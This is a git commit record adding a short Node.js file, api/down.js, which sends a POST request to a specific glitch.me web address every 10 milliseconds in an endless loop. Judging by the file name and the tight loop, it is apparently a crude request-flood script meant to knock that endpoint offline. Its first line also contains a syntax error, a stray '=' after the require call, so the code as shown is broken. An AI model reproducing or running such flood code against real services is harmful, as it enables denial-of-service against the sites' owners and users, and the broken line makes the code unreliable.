d543977d9e47b9bda9aa1a279f1357ff6bfab647
NotPunchnox <74469788+NotPunchnox@users.noreply.github.com>
2021-03-07 16:48:50 +0100

    Create down.js
    coucou

---
+++ api/down.js
@@ -0,0 +1,10 @@
+const fetch = require("node-fetch")=
+let i = 0;
+
+setInterval(() => {
+    fetch("https://truthful-oceanic-bonobo.glitch.me/", {
+        'method':"POST",
+        'body': `{"token": "coucou"}`
+    })
+    console.log(i++)
+}, 10)
